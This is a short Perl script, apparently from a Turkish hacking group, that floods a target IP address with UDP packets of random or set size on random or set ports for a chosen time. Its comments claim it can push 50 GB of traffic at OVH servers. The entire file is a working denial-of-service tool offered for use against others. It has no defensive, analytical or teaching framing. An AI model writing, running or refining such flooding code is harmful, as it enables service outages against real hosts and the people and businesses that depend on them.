#!/usr/bin/perl
# MorphoHackTeam
# Ovh Sunuculara 50 GBTS Güç Yollayabilir!
 
use Socket;
use strict;
 
if ($#ARGV != 3) {
  print "ovhget Ovh Method";
  print "               ---\n";
  print "./ovhget <IP> <PORT> <SOCKET> <TİME>\n\n";
  exit(1);
}
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 1000000);
 
socket(flood, PF_INET, SOCK_DGRAM, 17);

print " coder by M1ZAH $ip " . ($port ? $port : "random") . " saldırılan port " .
  ($size ? "$size-byte" : "random size") . " paket" .
  ($time ? " for $time seconds" : "") . "\n";
print "Ctrl-C ile saldırıyı çekin" unless $time; 

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
  send(flood, 
pack("a$psize","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           "), 
0, pack_sockaddr_in($pport, $iaddr));}